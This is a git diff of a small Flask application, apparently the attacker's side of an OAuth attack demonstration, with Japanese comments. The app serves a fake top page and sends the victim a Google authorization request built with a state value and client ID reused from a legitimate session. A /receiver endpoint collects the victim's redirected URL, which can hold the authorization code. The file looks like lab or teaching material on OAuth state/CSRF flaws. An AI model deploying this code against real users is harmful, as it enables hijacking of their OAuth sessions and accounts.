@@ -1,38 +1,39 @@
-from flask import Flask, render_template, request, session, redirect
-import random, string
+from flask import Flask, render_template, request, redirect
 from urllib.parse import urlencode
 from dotenv import load_dotenv
 import os
 from datetime import timedelta 
-import requests
-from requests.auth import HTTPBasicAuth
 
 # load envファイル
 load_dotenv()
 
 app = Flask(__name__)
 
-app.secret_key = 'evil'
-app.permanent_session_lifetime = timedelta(minutes=1)
-
-STATE_LEN = 30
-CODE_VERIFIER_LEN = 64
+# redirect_uri
+# 攻撃者は正常なページで認可リクエストを送信した際にURLから取得可能
 REDIRECT_URI = 'http://localhost:8080/callback'
-CLIENT_ID = os.getenv('CLIENT_ID')
-CLIENT_SECRET = os.getenv('CLIENT_SECRET')
 
-def randomname(n):
-  randlst = [random.choice(string.ascii_letters + string.digits) for i in range(n)]
-  return ''.join(randlst)
+# OAuthに必要なClient ID
+# 攻撃者は正常なページで認可リクエストを送信した際にURLから取得可能
+CLIENT_ID = os.getenv('CLIENT_ID')
 
 @app.route('/')
 def index():
+  '''
+  トップページ（偽）
+  '''
   return render_template('evil.html')
 
 @app.route('/oauth')
 def oauth():
-  session.permanent = True
-  state = "reheuyLuPmIsubnsaALFSDUc9fnc3G"
+  '''
+  OAuthの認証を行う
+
+  攻撃者は正常なページで認可リクエストを送信した際のstateを入力し、
+  被害者が偽装された認可リクエストを送信するようにする
+  '''
+
+  state = "G83hTkYyGDjcYIb1zbp5WRdT86C5OS"
 
   base_url = "https://accounts.google.com/o/oauth2/v2/auth"
   params = {
@@ -48,6 +49,9 @@ def oauth():
 
 @app.route('/receiver', methods=['POST'])
 def receiver():
+  '''
+  偽トップページから被害者のURL情報を受け取る
+  '''
   json = request.get_json()
   print(json['location'])
 
